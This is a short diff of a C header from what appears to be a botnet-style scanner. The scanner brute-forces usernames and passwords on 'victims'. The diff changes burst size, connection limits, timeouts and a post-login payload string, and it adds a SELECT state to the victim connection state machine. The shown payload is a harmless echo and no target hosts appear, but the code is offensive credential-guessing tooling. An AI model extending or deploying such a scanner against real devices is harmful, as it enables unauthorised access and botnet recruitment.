@@ -1,10 +1,12 @@
 #pragma once
 
 #define SCAN_SCANNER_BURST 200 // How many packets to send out each burst
-#define SCAN_SCANNER_MAXCON 10 // Maximum connections
-#define SCAN_SCANNER_SEC 5
-#define SCAN_SCANNER_USEC 0
-#define SCAN_SCANNER_PAYLOAD "echo Hello World!\r\n"
+#define SCAN_SCANNER_MAXCON 10 // Maximum connections white bruteforcing
+#define SCAN_SCANNER_TIMEOUT_SEC 5 // Scanner send and recv timeout in seconds
+#define SCAN_SCANNER_TIMEOUT_USEC 0 // Scanner send and recv timeout in useconds
+#define SCAN_SCANNER_STIMEOUT_SEC 5 // Scanner select timeout in seconds
+#define SCAN_SCANNER_STIMEOUT_USEC 0 // Scanner select timeout in useconds
+#define SCAN_SCANNER_PAYLOAD "echo Hello World!\r\n\0"
 
 #define usersize (sizeof(usernames) / sizeof(unsigned char *))
 #define passsize (sizeof(passwords) / sizeof(unsigned char *))
@@ -76,6 +78,7 @@ struct scan_victim
 	enum
 	{
 		CONNECTING,
+		SELECT,
 		USERNAME,
 		PASSWORD,
 		PAYLOAD,
